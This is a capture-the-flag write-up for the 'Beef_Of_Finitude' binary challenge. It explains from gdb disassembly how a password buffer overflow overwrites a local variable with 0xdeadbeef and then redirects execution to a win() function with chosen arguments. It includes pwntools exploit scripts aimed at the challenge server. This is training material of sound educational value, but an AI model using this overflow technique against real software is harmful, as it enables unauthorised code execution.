# Beef_Of_Finitude

To start off, we see a main function which calls function myFun.
   
* This functions takes in two inputs (strings), one as name and the other as password. 
* An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun.
* The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. 
* This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. 
* Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. 
```
To do that we may use the following code:

from pwn import *
r = remote('challenges.ctfd.io', 30027)

r.recvuntil('Enter your Name:')
r.sendline('shravya')

r.recvuntil('Enter your password:')
r.send('B'*26 + p32(0xdeadbeef))
r.interactive()
```
Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function. 

## The gdb dump for the win() function is:
```
   0x08049240 <+10>:	sub    esp,0x12c                                            ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 
   0x08049246 <+16>:	call   0x8049170 <__x86.get_pc_thunk.bx>                    ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 
   0x0804924b <+21>:	add    ebx,0x2db5                                           ; 
   0x08049251 <+27>:	mov    ecx,DWORD PTR [ebp+0x8]                              ; the following lines determine the 4 arguments to the win() function,
   0x08049254 <+30>:	mov    DWORD PTR [ebp-0x130],ecx                            ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0)))
   0x0804925a <+36>:	mov    ecx,DWORD PTR [ebp+0xc]                              ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66
   0x0804925d <+39>:	mov    DWORD PTR [ebp-0x12c],ecx                            
   0x08049263 <+45>:	mov    ecx,DWORD PTR [ebp+0x10]
   0x08049266 <+48>:	mov    DWORD PTR [ebp-0x138],ecx
   0x0804926c <+54>:	mov    ecx,DWORD PTR [ebp+0x14]
   0x0804926f <+57>:	mov    DWORD PTR [ebp-0x134],ecx
   0x08049275 <+63>:	mov    ecx,DWORD PTR [ebp-0x130]
   0x0804927b <+69>:	xor    ecx,0x14b4da55
   0x08049281 <+75>:	mov    esi,ecx
   0x08049283 <+77>:	mov    ecx,DWORD PTR [ebp-0x12c]
   0x08049289 <+83>:	xor    ch,0x0
   0x0804928c <+86>:	mov    edi,ecx
   0x0804928e <+88>:	mov    ecx,edi
   0x08049290 <+90>:	or     ecx,esi
   0x08049292 <+92>:	test   ecx,ecx
   0x08049294 <+94>:	jne    0x80492c0 <win+138>
   0x08049296 <+96>:	mov    ecx,DWORD PTR [ebp-0x138]
   0x0804929c <+102>:	xor    ecx,0x67616c66
   ```
   Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to:
   1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with,
   2. rewrite the return address stored at eip to that of the win function, 
   3. pass arguments of win function, i.e 
         param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0)
   
## python program : (cotinuation)
   ```
   from pwn import *
   r = remote('challenges.ctfd.io', 30027)

   r.recvuntil('Enter your Name:')
   r.sendline('hi')

   r.recvuntil('Enter your password:')
   r.sendline('B'*26 + p32(0xdeadbeef) + 'B'*12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0))

   r.interactive()
   ```
### Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}

